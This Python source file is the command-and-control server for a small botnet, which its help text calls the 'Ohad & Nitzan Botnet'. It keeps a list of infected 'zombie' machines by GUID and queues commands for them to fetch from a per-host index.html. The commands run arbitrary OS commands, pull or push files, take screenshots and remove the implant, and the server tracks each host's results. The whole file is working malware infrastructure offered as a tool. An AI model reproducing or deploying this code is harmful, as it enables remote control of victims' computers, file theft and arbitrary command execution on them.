import ast # used to serialize raw list to list data type
import os
id = 0

class Zombie:
    """ zombie class, hold all varaibles and functions of the zombie """
    def __init__(self, guid):
        """ constuctor """
        self.guid = guid
        self.active = True
        self.cmds = []

    # all of possible functions, each one is added to the cmd list
    # START->
    def get_file(self, file_name):
        self.update_cmds("getfile " + file_name)

    def put_file(self, file_name):
        self.update_cmds("putfile " + file_name)

    def os_cmd(self, cmd):
        self.update_cmds(cmd)

    def remove(self):
        self.update_cmds("remove")
    # <-END

    def sync_cmd(self):
        """ remove all done commands from cmd list """
        ID, flag = 1, 1
        final = []

        lst = open(self.guid+"/list.txt", "r").read()
        lst = ast.literal_eval(lst)
        dest = self.cmds

        for cmd in dest:
            for cmd_2 in lst:
                if(cmd[ID] == cmd_2[ID]):
                    flag = 0

            if(flag):
                final.append(cmd)
            else:
                flag = 1
        print("synced", final)
        self.cmds = final

    def update_cmds(self, x):
        """ insert command to the list and update id"""
        global id

        self.cmds.insert(0, [x, id])
        id += 1

    def write_index(self):
        """ write commands to index """
        f = open(self.guid+"/index.html", "w")
        f.write(str(self.cmds))
        f.close()

    def show_cmd_output(self, id):
        """ return commands's output """
        CMD, ID, OUTPUT = 0, 1, 2
        s = ""

        o = open(self.guid+"/list.txt", "r").read()
        o = ast.literal_eval(o)
        for cmd in o:
            if cmd[ID] == id:
                s += cmd[CMD] + " ->" + "\n"
                s += cmd[OUTPUT] + "\n"
                break

        return s

    def show_done_cmd(self):
        """ return all done commands """
        CMD, ID, OUTPUT = 0, 1, 2
        o = open(self.guid+"/list.txt", "r").read()
        o = ast.literal_eval(o)
        s = ""
        s += "COMMAND | ID\n"
        if o != []:
            for cmd in o:
                s += cmd[CMD] + " | " + str(cmd[ID]) + "\n"
        else:
            s += "none"

        return s

    def show_pending_cmd(self):
        """ return pending commands list """

        return str(self.cmds)

class Shell:
    """ get command and execute it """
    def handle_command(self, cmd, zombie_list):
        """ handle command """
        # all possible commands
        # START->
        getfile = ("getfile" in cmd)
        putfile = ("putfile" in cmd)
        show_cmd_output = ("show output" in cmd)#<zombie id> <cmd id>
        show_done_cmd = ("show done" in cmd)#<zombie id>
        show_pending_cmd = ("show pending" in cmd)#<zombie id>
        show_zombies = ("show zombies" in cmd)
        show_help = ("show help" in cmd)
        exitt = ("exit" in cmd)
        # <-END

        if getfile:
            for zombie in zombie_list.lis:
                zombie.get_file(cmd.split(" ")[1])

        elif putfile:
            for zombie in zombie_list.lis:
                zombie.put_file(cmd.split(" ")[1])

        elif show_cmd_output:
            id = cmd.split(" ")[2]
            cmd_id = cmd.split(" ")[3]
            return zombie_list[int(id)].show_cmd_output(int(cmd_id))

        elif show_done_cmd:
            id = cmd.split(" ")[2]
            return zombie_list[int(id)].show_done_cmd()

        elif show_pending_cmd:
            id = cmd.split(" ")[2]
            return zombie_list[int(id)].show_pending_cmd()

        elif show_zombies:
            return zombie_list.print_zombies()

        elif show_help:
            return self.show_help()

        elif exitt:
            return 0

        else: # os command
            for zombie in zombie_list.lis:
                zombie.os_cmd(cmd)

        return "done!"

    def run(self, c, zombie_list):
        # run command
        c = self.handle_command(c, zombie_list)
        if c == 0:
            return 0
        return c

    def show_help(self):
        h  ="""                  #
    ##            ##                 ##
   ##    #######  ###  ## #######     ##
  ##           ## #### ##       ##     ##
 ##       ##   ## #######  ######       ##
  ##      ##   ## ### ###  ###  ##     ##
   ##      #####  ###  ##  ######     ##
    ##                  #            ##   """
        h += "\nWelcome to Ohad & Nitzan Botnet\n"
        h += "to send command use: /sendcmd/%cmd%\n"
        h += "possible commands:\n"
        h += "- show output <zombie id> <cmd id>\n"
        h += "- show done <zombie id>\n"
        h += "- show pending <zombie id>\n"
        h += "- show zombies\n"
        h += "- show help\n"
        h += "- screenshot\n"
        h += "- opendisc\n"
        h += "- exit\n"

        return h

class ZombieList:
    """ class that is list of zombies with functions """
    def __init__(self):
        """ constuctor """
        self.lis = []

    def get_zombie(self, guid):
        """ get zombie by guid """
        for zombie in self.lis:
            if zombie.guid == guid:
                return zombie

    def add_zombie(self, zombie):
        """ add zombie to the list """
        self.lis.append(zombie)
        guid = zombie.guid

        if(not os.path.exists(guid+"/index.html")):
            os.mkdir(guid)
            f = open(guid+"/index.html", "w+")
            f.write("[]")
            f.close()
            f = open(guid+"/list.txt", "w+")
            f.write("[]")
            f.close()

    def set_zombie(self, old_zmb, new_zmb):
        """ set zombie to new zombie """
        self.lis[self.lis.index(old_zmb)] = new_zmb

    def del_zombie(self, zombie):
        """ remove zombie from list """

        del self.lis[self.lis.index(zombie)]

    def get_zombies(self):
        """ return zombie list """

        return self.lis

    def print_zombies(self):
        """ print zombie list """
        i = 0
        s = ""
        s += "ID | GUID | ACTIVE\n"
        for zombie in self.lis:
            s += str(i) + " | " + zombie.guid + " | " + str(zombie.active) + "\n"
            i+=1

        return s

    def sync_cmds(self, guid):
        """ sync done commands with zombie """
        self.get_zombie(guid).sync_cmd()
        self.get_zombie(guid).write_index()

    def __getitem__(self, index):
        """ handle use of brackets([]) """

        return self.lis[index]

class WebServer:
    """ server class, holds instance of 'shell' and 'zombie_list' """
    def __init__(self):
        self.zombie_list = ZombieList()
        self.shell = Shell()
